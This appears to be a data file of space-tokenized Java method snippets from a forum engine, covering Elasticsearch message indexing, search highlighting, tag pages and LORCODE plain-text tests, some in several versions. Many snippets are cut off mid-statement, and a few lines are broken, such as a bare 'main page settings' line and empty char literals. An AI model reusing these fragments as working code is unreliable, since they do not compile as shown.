public void handleMessage ( UpdateMonth msgUpdate ) throws MessageNotFoundException , IOException { if ( ! mappingsSet ) { updateMapping ( ) ; } int month = msgUpdate . getMonth ( ) ; int year = msgUpdate . getYear ( ) ; logger . info ( " Indexing month " + year + '/' + month ) ; long startTime = System . nanoTime ( ) ; List < Integer > topicIds = topicDao . getMessageForMonth ( year , month ) ; for ( int topicId : topicIds ) { reindexMessage ( topicId , true ) ; } long endTime = System . nanoTime ( ) ; logger . info ( " Reindex month " + year + '/' + month + " done, " + ( endTime - startTime ) / 1000000 + " millis " ) ; } 
private void updateMessage ( Topic topic ) throws IOException { Map < String , Object > doc = new HashMap < > ( ) ; doc . put ( " id " , topic . getId ( ) ) ; Section section = sectionService . getSection ( topic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( topic . getGroupId ( ) ) ; User author = userDao . getUserCached ( topic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " topic_author " , author . getNick ( ) ) ; doc . put ( " topic_id " , topic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; doc . put ( " title " , StringEscapeUtils . unescapeHtml ( topic . getTitle ( ) ) ) ; doc . put ( " topic_title " , topic . getTitle ( ) ) ; doc . put ( " message " , msgbaseDao . getMessageText ( topic . getId ( ) ) . getText ( ) ) ; Date postdate = topic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( topic . getId ( ) ) ) 
private IndexRequestBuilder processComment ( Topic topic , Comment comment , String message ) { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( topic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( topic . getGroupId ( ) ) ; User author = userDao . getUserCached ( comment . getUserid ( ) ) ; User topicAuthor = userDao . getUserCached ( topic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " topic_author " , topicAuthor . getNick ( ) ) ; doc . put ( " topic_id " , topic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; String topicTitle = topic . getTitle ( ) ; doc . put ( " topic_title " , StringEscapeUtils . unescapeHtml ( topicTitle ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( topicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . put ( " title " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . put ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " is_comment " , true ) ; return client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( comment . getId ( ) ) ) 
private void updateMapping ( ) throws IOException { logger . info ( " Updating ElasticSearch mappings " ) ; String mappingSource = IOUtils . toString ( getClass ( ) . getClassLoader ( ) . getResource ( " es-mapping.json " ) ) ; client . admin ( ) . indices ( ) . prepareCreate ( MESSAGES_INDEX ) . addMapping ( MESSAGES_TYPE , mappingSource ) . execute ( ) . actionGet ( ) ; mappingsSet = true ; } 
private void updateMessage ( Topic topic ) throws IOException { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( topic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( topic . getGroupId ( ) ) ; User author = userDao . getUserCached ( topic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " topic_author " , author . getNick ( ) ) ; doc . put ( " topic_id " , topic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; doc . put ( " title " , StringEscapeUtils . unescapeHtml ( topic . getTitle ( ) ) ) ; doc . put ( " topic_title " , topic . getTitle ( ) ) ; doc . put ( " message " , msgbaseDao . getMessageText ( topic . getId ( ) ) . getText ( ) ) ; Date postdate = topic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( topic . getId ( ) ) ) 
private void updateMapping ( ) throws IOException { logger . info ( " Updating ElasticSearch mappings " ) ; String mappingSource = IOUtils . toString ( getClass ( ) . getClassLoader ( ) . getResource ( " es-mapping.json " ) ) ; if ( ! client . admin ( ) . indices ( ) . prepareExists ( MESSAGES_INDEX ) . execute ( ) . actionGet ( ) . isExists ( ) ) { client . admin ( ) . indices ( ) . prepareCreate ( MESSAGES_INDEX ) . execute ( ) . actionGet ( ) ; } client . admin ( ) . indices ( ) . preparePutMapping ( MESSAGES_INDEX ) . setType ( MESSAGES_TYPE ) . setSource ( mappingSource ) . execute ( ) . actionGet ( ) ; mappingsSet = true ; } 
private String extractText ( MessageText text ) { if ( text . isLorcode ( ) ) { return lorCodeService . parseForOgDescription ( text . getText ( ) ) ; 
private void updateMessage ( Topic topic ) throws IOException { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( topic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( topic . getGroupId ( ) ) ; User author = userDao . getUserCached ( topic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " topic_author " , author . getNick ( ) ) ; doc . put ( " topic_id " , topic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; doc . put ( " title " , StringEscapeUtils . unescapeHtml ( topic . getTitle ( ) ) ) ; doc . put ( " topic_title " , topic . getTitle ( ) ) ; doc . put ( " message " , extractText ( msgbaseDao . getMessageText ( topic . getId ( ) ) ) ) ; Date postdate = topic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( topic . getId ( ) ) ) 
private void setupHighlight ( SearchRequestBuilder request ) { HighlightBuilder . Field title = new HighlightBuilder . Field ( " title " ) ; title . numOfFragments ( 0 ) ; request . addHighlightedField ( title ) ; HighlightBuilder . Field topicTitle = new HighlightBuilder . Field ( " topic_title " ) ; topicTitle . numOfFragments ( 0 ) ; request . addHighlightedField ( topicTitle ) ; request . setHighlighterEncoder ( " html " ) ; request . setHighlighterPreTags ( " <em class=search-hl> " ) ; request . setHighlighterPostTags ( " </em> " ) ; } 
public void handleMessage ( UpdateMessage msgUpdate ) throws MessageNotFoundException , IOException { if ( ! mappingsSet ) { createIndex ( ) ; } logger . info ( " Indexing " + msgUpdate . getMsgid ( ) ) ; reindexMessage ( msgUpdate . getMsgid ( ) , msgUpdate . isWithComments ( ) ) ; } 
public void handleMessage ( UpdateMonth msgUpdate ) throws MessageNotFoundException , IOException { if ( ! mappingsSet ) { createIndex ( ) ; } int month = msgUpdate . getMonth ( ) ; int year = msgUpdate . getYear ( ) ; logger . info ( " Indexing month " + year + '/' + month ) ; long startTime = System . nanoTime ( ) ; List < Integer > topicIds = topicDao . getMessageForMonth ( year , month ) ; for ( int topicId : topicIds ) { reindexMessage ( topicId , true ) ; } long endTime = System . nanoTime ( ) ; logger . info ( " Reindex month " + year + '/' + month + " done, " + ( endTime - startTime ) / 1000000 + " millis " ) ; } 
private void createIndex ( ) throws IOException { if ( ! client . admin ( ) . indices ( ) . prepareExists ( MESSAGES_INDEX ) . execute ( ) . actionGet ( ) . isExists ( ) ) { String mappingSource = IOUtils . toString ( getClass ( ) . getClassLoader ( ) . getResource ( " es-mapping.json " ) ) ; logger . info ( " Create ElasticSearch index " ) ; client . admin ( ) . indices ( ) . prepareCreate ( MESSAGES_INDEX ) . setSource ( mappingSource ) . execute ( ) . actionGet ( ) ; } mappingsSet = true ; } 
private void setupHighlight ( SearchRequestBuilder request ) { HighlightBuilder . Field title = new HighlightBuilder . Field ( " title " ) ; title . numOfFragments ( 0 ) ; request . addHighlightedField ( title ) ; HighlightBuilder . Field topicTitle = new HighlightBuilder . Field ( " topic_title " ) ; topicTitle . numOfFragments ( 0 ) ; request . addHighlightedField ( topicTitle ) ; HighlightBuilder . Field message = new HighlightBuilder . Field ( " message " ) ; message . numOfFragments ( 1 ) ; message . fragmentSize ( MESSAGE_FRAGMENT ) ; request . addHighlightedField ( message ) ; request . setHighlighterEncoder ( " html " ) ; request . setHighlighterPreTags ( " <em class=search-hl> " ) ; request . setHighlighterPostTags ( " </em> " ) ; } 
private void updateLatestEditorInfo ( User editor , Comment original , Comment comment ) { List < EditHistoryDto > editHistoryDtoList = editHistoryService . getEditInfo ( original . getId ( ) , EditHistoryObjectTypeEnum . COMMENT ) ; commentDao . updateLatestEditorInfo ( original . getId ( ) , 
public void deleteImage ( User editor , Image image ) { EditHistoryDto info = new EditHistoryDto ( ) ; info . setEditor ( editor . getId ( ) ) ; info . setMsgid ( image . getTopicId ( ) ) ; info . setOldimage ( image . getId ( ) ) ; info . setObjectType ( EditHistoryObjectTypeEnum . TOPIC ) ; imageDao . deleteImage ( image ) ; editHistoryService . insert ( info ) ; topicDao . updateLastmod ( image . getTopicId ( ) , false ) ; } 
public void updateLastmod ( int topicId , boolean bump ) { if ( bump ) { jdbcTemplate . update ( " UPDATE topics SET lastmod=now() WHERE id=? " , topicId ) ; 
public boolean isComment ( ) { return ! " wiki " . equals ( " section " ) & & topic ! = Integer . valueOf ( msgid ) ; } 
public void commit ( Topic msg , User commiter ) { jdbcTemplate . update ( " UPDATE topics SET moderate='t', commitby=?, commitdate=CURRENT_TIMESTAMP, lastmod=CURRENT_TIMESTAMP WHERE id=? " , 
public void publish ( Topic msg ) { jdbcTemplate . update ( " UPDATE topics SET draft='f',postdate=CURRENT_TIMESTAMP,lastmod=CURRENT_TIMESTAMP WHERE id=? AND draft " , 
public void addTest ( ) { prepareUserTags ( ) ; userTagDao . addTag ( user1Id , tag1Id , false ) ; int result ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_FAVORITE_BY_USER , Integer . class , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_IGNORE_BY_USER , Integer . class , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_FAVORITE_BY_USER , Integer . class , user2Id ) ; assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_IGNORE_BY_USER , Integer . class , user2Id ) ; assertEquals ( " Wrong count of user tags. " , 0 , result ) ; result = jdbcTemplate . queryForObject ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , Integer . class , tag1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; } 
public void deleteOneTest ( ) { prepareUserTags ( ) ; userTagDao . deleteTag ( user1Id , tag1Id , true ) ; userTagDao . deleteTag ( user1Id , tag2Id , true ) ; int result ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_FAVORITE_BY_USER , Integer . class , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; userTagDao . deleteTag ( user1Id , tag2Id , false ) ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_FAVORITE_BY_USER , Integer . class , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_IGNORE_BY_USER , Integer . class , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 1 , result ) ; } 
public void deleteAllTest ( ) { prepareUserTags ( ) ; userTagDao . deleteTags ( tag2Id ) ; int result ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_FAVORITE_BY_USER , Integer . class , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 4 , result ) ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_IGNORE_BY_USER , Integer . class , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 1 , result ) ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_FAVORITE_BY_USER , Integer . class , user2Id ) ; assertEquals ( " Wrong count of user tags. " , 4 , result ) ; } 
private QueryBuilder processQueryString ( Client client , String queryText ) { QueryStringQueryBuilder esQuery = queryString ( queryText ) ; esQuery . lenient ( true ) ; ValidateQueryResponse response = client . admin ( ) . indices ( ) . prepareValidateQuery ( SearchQueueListener . MESSAGES_INDEX ) . setTypes ( SearchQueueListener . MESSAGES_TYPE ) . setQuery ( esQuery ) . execute ( ) . actionGet ( ) ; if ( response . isValid ( ) ) { return esQuery ; 
private QueryBuilder processQueryString ( Client client , String queryText ) { String fixedText = queryText . replaceAll ( " ((?: \\ [)|(?:])|(?:[ \\ \\ /])) " , " \\ \\ $1 " ) ; QueryStringQueryBuilder esQuery = queryString ( fixedText ) ; esQuery . lenient ( true ) ; ValidateQueryResponse response = client . admin ( ) . indices ( ) . prepareValidateQuery ( SearchQueueListener . MESSAGES_INDEX ) . setTypes ( SearchQueueListener . MESSAGES_TYPE ) . setQuery ( esQuery ) . execute ( ) . actionGet ( ) ; if ( response . isValid ( ) ) { return esQuery ; 
private QueryBuilder boost ( QueryBuilder query ) { FunctionScoreQueryBuilder booster = functionScoreQuery ( query ) ; booster . add ( termFilter ( " is_comment " , " false " ) , ScoreFunctionBuilders . factorFunction ( TOPIC_BOOST ) ) ; return booster ; } 
public ModelAndView handleSectionNotFoundException ( SectionNotFoundException ex ) { return new ModelAndView ( " errors/code404 " ) ; } 
private void setupHighlight ( SearchRequestBuilder request ) { HighlightBuilder . Field title = new HighlightBuilder . Field ( " title " ) ; title . numOfFragments ( 0 ) ; request . addHighlightedField ( title ) ; HighlightBuilder . Field topicTitle = new HighlightBuilder . Field ( " topic_title " ) ; topicTitle . numOfFragments ( 0 ) ; request . addHighlightedField ( topicTitle ) ; HighlightBuilder . Field message = new HighlightBuilder . Field ( " message " ) ; message . numOfFragments ( 1 ) ; message . fragmentSize ( MESSAGE_FRAGMENT ) ; message . noMatchSize ( MESSAGE_FRAGMENT ) ; request . addHighlightedField ( message ) ; request . setHighlighterEncoder ( " html " ) ; request . setHighlighterPreTags ( " <em class=search-hl> " ) ; request . setHighlighterPostTags ( " </em> " ) ; } 
private QueryBuilder boost ( QueryBuilder query ) { FunctionScoreQueryBuilder booster = functionScoreQuery ( query ) ; booster . add ( termFilter ( " is_comment " , " false " ) , ScoreFunctionBuilders . factorFunction ( TOPIC_BOOST ) ) ; booster . add ( rangeFilter ( " postdate " ) . from ( " now-3y " ) , ScoreFunctionBuilders . factorFunction ( RECENT_BOOST ) ) ; return booster ; } 
private void updateMessage ( Topic topic ) throws IOException { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( topic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( topic . getGroupId ( ) ) ; User author = userDao . getUserCached ( topic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " topic_author " , author . getNick ( ) ) ; doc . put ( " topic_id " , topic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; doc . put ( " title " , StringEscapeUtils . unescapeHtml ( topic . getTitle ( ) ) ) ; doc . put ( " topic_title " , topic . getTitle ( ) ) ; doc . put ( " message " , extractText ( msgbaseDao . getMessageText ( topic . getId ( ) ) ) ) ; Date postdate = topic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " tag " , topicDao . getTags ( topic ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( topic . getId ( ) ) ) 
private IndexRequestBuilder processComment ( Topic topic , Comment comment , String message ) { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( topic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( topic . getGroupId ( ) ) ; User author = userDao . getUserCached ( comment . getUserid ( ) ) ; User topicAuthor = userDao . getUserCached ( topic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " topic_author " , topicAuthor . getNick ( ) ) ; doc . put ( " topic_id " , topic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; String topicTitle = topic . getTitle ( ) ; doc . put ( " topic_title " , StringEscapeUtils . unescapeHtml ( topicTitle ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( topicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . put ( " title " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . put ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " tag " , topicDao . getTags ( topic ) ) ; doc . put ( " is_comment " , true ) ; return client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( comment . getId ( ) ) ) 
public String renderNodeXhtml ( Node node ) { if ( NodeUtils . isEmptyNode ( node ) ) { return " " ; } StringBuilder ret = new StringBuilder ( ) ; if ( node . isParameter ( ) ) { String lang = node . getParameter ( ) . trim ( ) . toLowerCase ( ) ; if ( langHash . containsKey ( lang ) ) { ret . append ( " <div class= \" code \" ><pre class= \" " ) . append ( langHash . get ( lang ) ) . append ( " \" ><code> " ) ; } else { ret . append ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code> " ) ; } } else { ret . append ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code> " ) ; } ret . append ( node . renderChildrenXHtml ( ) ) ; ret . append ( " </code></pre></div> " ) ; return ret . toString ( ) ; } 
private void reindexMessage ( int msgid , boolean withComments ) throws MessageNotFoundException { Topic msg = topicDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) & & ! msg . isDraft ( ) ) { updateMessage ( msg ) ; } else { client . prepareDelete ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( msg . getId ( ) ) ) . execute ( ) . actionGet ( ) ; logger.info("Deleting message "+msgid+" from solr"); } if (withComments) { CommentList commentList = commentService.getCommentList(msg, true); 
private void updateMessage ( Topic topic ) { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( topic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( topic . getGroupId ( ) ) ; User author = userDao . getUserCached ( topic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " topic_author " , author . getNick ( ) ) ; doc . put ( " topic_id " , topic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; doc . put ( " title " , StringEscapeUtils . unescapeHtml ( topic . getTitle ( ) ) ) ; doc . put ( " topic_title " , topic . getTitle ( ) ) ; doc . put ( " message " , extractText ( msgbaseDao . getMessageText ( topic . getId ( ) ) ) ) ; Date postdate = topic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " tag " , topicDao . getTags ( topic ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( topic . getId ( ) ) ) 
private String extractText ( MessageText text ) { if ( text . isLorcode ( ) ) { return lorCodeService . extractPlainText ( text . getText ( ) ) ; 
public String extractPlainText ( String text ) { return defaultParser . parseRoot ( prepareCommentRootNode ( false , true , false ) , text ) . renderOg ( ) ; } 
public String extractPlainText ( String text , int maxLength ) { String plainText = extractPlainText ( text ) ; if ( plainText . length ( ) < maxLength ) { return plainText ; 
public boolean isEmptyTextComment ( String msg ) { return extractPlainText ( msg . trim ( ) ) . isEmpty ( ) ; } 
public void testOg ( ) { assertEquals ( " hello " , lorCodeService . extractPlainText ( " hello " ) ) ; assertEquals ( " one crap two three " , lorCodeService . extractPlainText ( " [list] " + " [*]one " + '' + " crap " + " [*]two " + " [*]three " + " [/list] " ) ) ; assertEquals ( " due one teo neo wuf? nok " , lorCodeService . extractPlainText ( " due n[quote][quote]one[br][/quote]teo[br][quote]neo[br][/quote][/quote]wuf? nok " ) ) ; assertEquals ( " &amp;#9618; " , lorCodeService . extractPlainText ( " [code]&#9618;[/code] " ) ) ; String txt = " many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b] " ; assertEquals ( " many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many t... " , lorCodeService . extractPlainText ( txt , 250 ) ) ; assertEquals ( 250 + 3 , 
public final String renderChildrenOg ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderOg ( ) ) ; stringBuilder . append ( ' ' ) ; } return stringBuilder . toString ( ) . trim ( ) ; } 
public String extractPlainText ( String text , int maxLength , boolean encodeHtml ) { String plainText = extractPlainText ( text ) ; String cut ; if ( plainText . length ( ) < maxLength ) { cut = plainText ; } else { cut = plainText . substring ( 0 , maxLength ) . trim ( ) + " ... " ; } if ( encodeHtml ) { return StringUtil . escapeForceHtml ( cut ) ; 
public void testOg ( ) { assertEquals ( " hello " , lorCodeService . extractPlainText ( " hello " ) ) ; assertEquals ( " one crap two three " , lorCodeService . extractPlainText ( " [list] " + " [*]one " + '' + " crap " + " [*]two " + " [*]three " + " [/list] " ) ) ; assertEquals ( " due one teo neo wuf? nok " , lorCodeService . extractPlainText ( " due n[quote][quote]one[br][/quote]teo[br][quote]neo[br][/quote][/quote]wuf? nok " ) ) ; assertEquals ( " &amp;#9618; " , lorCodeService . extractPlainText ( " [code]&#9618;[/code] " , 250 , true ) ) ; String txt = " many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b] " ; assertEquals ( " many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many t... " , lorCodeService . extractPlainText ( txt , 250 , true ) ) ; assertEquals ( 250 + 3 , 
public User getUser ( String nick ) throws UserNotFoundException { if ( nick = = null ) { throw new NullPointerException ( ) ; } if ( ! StringUtil . checkLoginName ( nick ) ) { logger . warn ( " Invalid user name '{}' " , nick ) ; throw new UserNotFoundException ( " <invalid name> " ) ; } List < Integer > list = jdbcTemplate . queryForList ( queryUserIdByNick , Integer . class , nick ) ; if ( list . isEmpty ( ) ) { throw new UserNotFoundException ( nick ) ; } if ( list . size ( ) > 1 ) { throw new RuntimeException ( " list.size()>1 ??? " ) ; } return getUser ( list . get ( 0 ) ) ; } 
private QueryBuilder processQueryString ( Client client , String queryText ) { String fixedText = queryText . replaceAll ( " ((?: \\ [)|(?:])|(?:[ \\ \\ /])) " , " \\ \\ $1 " ) ; QueryStringQueryBuilder esQuery = queryString ( fixedText ) ; esQuery . lenient ( true ) ; esQuery . minimumShouldMatch ( " 50% " ) ; ValidateQueryResponse response = client . admin ( ) . indices ( ) . prepareValidateQuery ( SearchQueueListener . MESSAGES_INDEX ) . setTypes ( SearchQueueListener . MESSAGES_TYPE ) . setQuery ( esQuery ) . execute ( ) . actionGet ( ) ; if ( response . isValid ( ) ) { return esQuery ; 
public void changeTag ( int tagId , String tagName ) { jdbcTemplate . update ( " UPDATE tags_values set value=? WHERE id=? " , tagName , tagId ) ; } 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < > ( ) ; defaults . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; defaults . put ( HOVER_PROPERTY , Boolean . TRUE ) ; defaults . put ( STYLE_PROPERTY , " tango " ) ; defaults . put ( FORMAT_MODE_PROPERTY , " quot " ) ; defaults . put ( TOPICS_PROPERTY , 30 ) ; defaults . put ( MESSAGES_PROPERTY , 50 ) ; defaults . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; defaults . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; defaults . put ( AVATAR_PROPERTY , " empty " ) ; defaults . put ( HIDE_ADSENSE_PROPERTY , true ) ; defaults . put ( MAIN_GALLERY_PROPERTY , false ) ; defaults . put ( SHOW_SOCIAL_PROPERTY , true ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of( "poll", "top10", "gallery", "tagcloud", "archive", "ibm" ); defaults.put(BOXES_MAIN2_PROPERTY, boxes); return defaults; } 
public void processRow ( ResultSet rs ) throws SQLException { tags . add ( new TagInfo ( rs . getString ( " value " ) , rs . getInt ( " counter " ) ) ) ; } 
public String apply ( TagInfo input ) { return input . name ( ) ; } 
private List < TopicsListItem > prepareTopic ( SqlRowSet rs , int messagesInPage ) { List < TopicsListItem > topicsList = new ArrayList < > ( ) ; while ( rs . next ( ) ) { User author ; author = userDao . getUserCached ( rs . getInt ( " userid " ) ) ; ImmutableList < String > tags = topicTagService . getTagsForTitle ( rs . getInt ( " msgid " ) ) ; TopicsListItem topic = new TopicsListItem ( author , rs , messagesInPage , tags ) ; topicsList . add ( topic ) ; } return topicsList ; } 
public int doStartTag ( ) throws JspException { JspWriter out = pageContext . getOut ( ) ; if ( list ! = null ) { try { StringBuilder buf = new StringBuilder ( ) ; for ( String el : list ) { if ( buf . length ( ) > 0 ) { buf . append ( " , " ) ; } if ( TagName . isGoodTag ( el ) ) { buf . append ( " <a class=tag rel=tag href= \" " ) . append ( TagTopicListController . tagListUrl ( el ) ) . append ( " \" > " ) . append ( StringUtil . escapeHtml ( el ) ) . append ( " </a> " ) ; } else { buf . append ( StringUtil . escapeHtml ( el ) ) ; } } out . append ( buf ) ; } catch ( IOException e ) { throw new JspException ( " Error: " + e . getMessage ( ) ) ; } } return SKIP_BODY ; } 
public boolean apply ( String input ) { return TagName . isGoodTag ( input ) ; } 
public ModelAndView tagPage ( HttpServletRequest request , @PathVariable String tag ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; TagName . checkTag ( tag ) ; ModelAndView mv = new ModelAndView ( " tag-page " ) ; mv . addObject ( " tag " , tag ) ; mv . addObject ( " title " , WordUtils . capitalize ( tag ) ) ; mv . addObject ( " counter " , tagService . getCounter ( tag ) ) ; if ( tmpl . isSessionAuthorized ( ) ) { mv . addObject ( " showFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; mv . addObject ( " showUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; } int tagId = tagService . getTagId ( tag ) ; mv . addObject ( " favsCount " , userTagService . countFavs ( tagId ) ) ; List < String > relatedTags = tagService . getRelatedTags ( tagId ) ; if ( relatedTags . size ( ) > 1 ) { mv . addObject ( " relatedTags " , relatedTags ) ; } mv . addAllObjects ( getNewsSection ( request , tag ) ) ; mv . addAllObjects ( getGallerySection ( tag , tagId , tmpl ) ) ; mv . addAllObjects ( getForumSection ( tag , tagId ) ) ; return mv ; } 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId , @RequestParam ( value = " tag " , required = false ) String tag ) throws UserErrorException { Map < String , Object > params = new HashMap < > ( ) ; if ( tag ! = null ) { TagName . checkTag ( tag ) ; params . put ( " tag " , tag ) ; } params . put ( " sectionId " , sectionId ) ; Section section = sectionService . getSection ( sectionId ) ; params . put ( " section " , section ) ; params . put ( " info " , sectionService . getAddInfo ( section . getId ( ) ) ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " add-section " , params ) ; } 
